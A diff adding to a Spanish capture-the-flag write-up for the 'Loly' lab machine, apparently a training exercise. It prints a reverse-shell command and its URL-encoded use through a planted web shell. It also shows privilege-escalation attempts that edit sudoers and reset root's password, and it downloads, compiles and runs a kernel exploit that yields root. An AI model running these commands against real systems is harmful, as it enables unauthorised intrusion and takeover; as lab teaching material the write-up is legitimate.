@@ -236,6 +236,7 @@ Sin embargo, para trabajar más cómodamente vamos a entablar una reverse shell 
 ```bash
 > bash -c "/bin/bash -i >%26 /dev/tcp/192.168.1.80/443 0>%261"
 ``` 
+
 http://loly.lc/wordpress/wp-content/banners/rce.php?c=bash%20-c%20%22/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.1.80/443%200%3E&1%22
 ![reverse-shell-stablished.png](reverse-shell-stablished.png)
 
@@ -374,10 +375,12 @@ drwxr-xr-x 3 root root 4096 Aug 19  2020 ..
 -rw-r--r-- 1 loly loly    0 Aug 19  2020 .sudo_as_admin_successful
 -rw------- 1 loly loly  614 Aug 20  2020 .viminfo
 ```
+
 -------------------------------------------------------------------------------
 
 ```bash
 loly@ubuntu:~$ cat .bash_history 
+
 sudo -l
 id
 su root
@@ -396,16 +399,63 @@ sudo passwd root
 su root
 ```
 
+Miramos qué hace el script cleanup.py:
+
+```bash
+loly@ubuntu:~$ cat cleanup.py 
+import os
+import sys
+try:
+	os.system('rm -r /tmp')
+except:
+	sys.exit()
+```
+
+Es decir, borra el contenido del directorio tmp. Viendo el directorio tmp, se puede ver que no hay nada interesante, es más. Ejecutando el script anterior, no funciona porque el usuario loly no tiene permisos para borrar algunos ficheros de dicho directorio.
+
+Por mirar otras cosas, miramos qué significa .syslog_as_admin_successful, que a priori, parece una pista. Pero mirando en google vemos que no lo es:
+Google.
+
+![sudo_as_admin_successful_1.png](sudo_as_admin_successful_1.png)
+![sudo_as_admin_successful_2.png](sudo_as_admin_successful_2.png)
+
+Siguiendo mirando otras cosas mirarmos los ficheros de configuración de cron. 
+Vemos que en uno de los archivos hay un script que se ejecuta regularmente llamado popularity_contest.
+Buscando en Google.
 -------------------------------------------------------------------------------
 
 https://askubuntu.com/questions/57808/what-is-the-popularity-contest-package-for
 
+![popularity_contest.png](popularity_contest.png.png)
+
+Seguimos investigando, esta vez inspeccionando los logs de /var/logs/auth.log y /var/logs/syslog.log
+
+vemos que parece que el script cleanup.py se está ejecutando cada 5 minutos y que es root quien lo ejecuta:
+
+Inicialmente la idea sería modificar el fichero python para escalar privilegios.
+
+Una idea es añadir al usuario loly al final del fichero sudoers, dandole privilegios de super usuario para /bin/bash
+
+```php
+os.system("loly ALL=NOPASSWD:/bin/bash >> /etc/sudoers")
+```
+
+Otra posible idea es cambiar el password de root a algo sencillo, como 123456
+
+```php
+os.system("echo 123456\n123456 | passwd")
+```
+
+Tras unas cuantas pruebas, ninguna funciona. De hecho el script sin modificar tampoco funciona, pues el contenido del directorio /tmp no se borra que es lo que cabía esperar, así que tenemos seguir investigando
+Intentamos ver si se puede encontrar la linea que invoca la tarea en cron. 
+
 Google: where are stored the cron user jobs?
+
 > Cron jobs are stored in a crontab file by username. These files are stored in /var/spool/cron/crontabs or /var/spool/cron/ .
 
+```bash> 
 loly@ubuntu:/var/spool/cron$ ls -la
 
-```bash
 total 12
 drwxr-xr-x 3 root root    4096 Aug 19  2020 .
 drwxr-xr-x 4 root root    4096 Aug 19  2020 ..
@@ -413,4 +463,128 @@ drwx-wx--T 2 root crontab 4096 Jan 21 01:55 crontabs
 loly@ubuntu:/var/spool/cron$ cd crontabs/
 bash: cd: crontabs/: Permission denied
 ```
+
+Por aquí llegamos a una vía muerta, así que hay que buscar otra vía para escalar privilegios.
+
+-------------------------------------------------------------------------------
+
+Miramos qué posibles exploits hay para el sistema operativo host.
+
+> searchsploit ubuntu 4.4 privilege escalation
+
+```bash
+$ searchsploit ubuntu 4.4 privilege scalation
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Esc | linux/local/40759.rb
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Es | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'targe | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - | windows_x86-64/local/47170.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BP | linux/local/39772.txt
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Pr | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter tar | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux M | linux/local/47169.c
+Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Nam | linux/local/41760.txt
+------------------------------------------------------------ ---------------------------------
+
+Shellcodes: No Results
+```
+
+Este es un Linux Kernel 4.4 por lo que el exploit:
+
+*"Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Pr | linux/local/45010.c"*
+
+podría funcionar.
+
+```bash
+> searchsploit -m 45010.c
+```
+
+ahora lo que haremos es copiar el exploit en la máquina víctima. Para ello montamos un servido http por python en nuestr máquina, en el mismo directorio donde tenermos el exploit extraido.
+
+```bash
+> python3 -m http.server 80
+```
+
+desde la máquina víctima hacemos:
+
+```bash
+> wget 192.168.1.80/45010.c
+```
+
+ahora que tenemos el exploit en la máquina víctima, lo compilamos
+
+```bash
+> gcc 45010.c -o exploit
+```
+
+y lo ejecutamos:
+
+```bash
+loly@ubuntu:~$ ./exploit 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff8800346de600
+[*] Leaking sock struct from ffff880034e7d280
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff8800786fa480
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff8800786fa480
+[*] credentials patched, launching shell...
+#_
+```
+
+En este punto tenemos el cursor parpadeando y si escribimos whoami, esto es lo que aparece:
+
+```bash
+#> whoami
+root
+```
+
+-------------------------------------------------------------------------------
+
+Ejecutamos una shell para operar con más comodidad:
+
+```bash
+#> /bin/bash 
+```
+
+y ya desde el directorio de root:
+
+```bash
+root@ubuntu:/root# ls -la
+total 28
+drwx------  2 root root 4096 Aug 20  2020 .
+drwxr-xr-x 22 root root 4096 Aug 19  2020 ..
+-rw-------  1 root root 1589 Aug 20  2020 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  266 Aug 19  2020 root.txt
+-rw-r--r--  1 root root   75 Aug 20  2020 .selected_editor
+```
+
+y vemos la flag:
+
+```bash
+root@ubuntu:/root# cat root.txt 
+  ____               ____ ____  ____  
+ / ___| _   _ _ __  / ___/ ___||  _ \ 
+ \___ \| | | | '_ \| |   \___ \| |_) |
+  ___) | |_| | | | | |___ ___) |  _ < 
+ |____/ \__,_|_| |_|\____|____/|_| \_\
+                                      
+Congratulations. I'm BigCityBoy
+```
+
 -------------------------------------------------------------------------------
